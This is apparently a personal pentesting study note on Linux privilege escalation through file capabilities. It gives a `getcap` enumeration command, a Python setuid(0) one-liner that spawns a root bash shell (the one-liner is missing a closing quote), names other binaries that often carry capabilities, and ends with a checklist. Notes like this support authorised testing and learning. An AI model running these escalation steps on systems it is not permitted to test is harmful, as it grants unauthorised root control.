# Hunting for capabilities

To find the avaliable capabilities in the system we need to run:
```bash
getcap -r / 2>/dev/null
```
- ![[Pasted image 20250117153831.png]]
- here we have 1 capability set
- `+ep` is for permit everything

So all capabilities are enabled.


So in this case we can try to use python to escalate:
```bash
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash)'
```
- ![[Pasted image 20250117154156.png]]

We cna see that we got a root shell.


This works because we have a capability for `python2.6` that permits everything.


# Command generally with capabilities

The tools that generally have capabilities are:
- `tar`
- `perl`
- `openssl`


In general always use:
```bash
getcap -r / 2>/dev/null
```

And then search on google.

# STEP TO PERFORM

- [ ] **Search for capabilities**
- `getcap -r / 2>/dev/null`

- [ ] **Run commands we find with high capabilities in order to gain root shell**
